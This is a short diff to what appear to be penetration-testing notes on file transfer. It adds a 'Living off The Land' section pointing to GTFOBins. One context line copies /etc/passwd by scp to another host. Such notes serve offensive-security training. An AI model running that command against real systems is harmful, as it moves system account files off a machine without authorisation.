@@ -8,6 +8,8 @@
   - [Web Upload](#web-upload)
   - [Alternative Web File Transfer Method](#alternative-web-file-transfer-method)
   - [SCP Upload](#scp-upload)
+ 
+- [Living off The Land](#living-off-the-land)
 
 # Download Operations
 
@@ -122,3 +124,7 @@ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
 
 ## nc tools
 the same as in download in reverse
+
+
+# Living off The Land
+check in [GTFOBins for Linux Binaries](https://gtfobins.github.io/) and search for download and upload
